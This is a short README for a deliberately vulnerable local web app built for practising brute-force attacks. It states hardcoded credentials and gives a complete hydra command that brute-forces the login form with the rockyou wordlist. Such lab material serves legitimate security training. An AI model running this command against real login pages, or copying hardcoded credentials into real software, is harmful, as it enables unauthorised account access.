# Minimal Victim App
This is a minimal Application to perform a Brute Force Attack against.

start this app with `docker-compose up` and navigate to (http://localhost:9999) to check its functionality

Hardcoded credentials are `admin:password123`.

you can attack its loginform with hydra using this command:
hydra -l user -P rockyou.txt <IPADRESS> -s 9999 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -V


See [hydra website(https://www.kali.org/tools/hydra/)] for more information on hydra.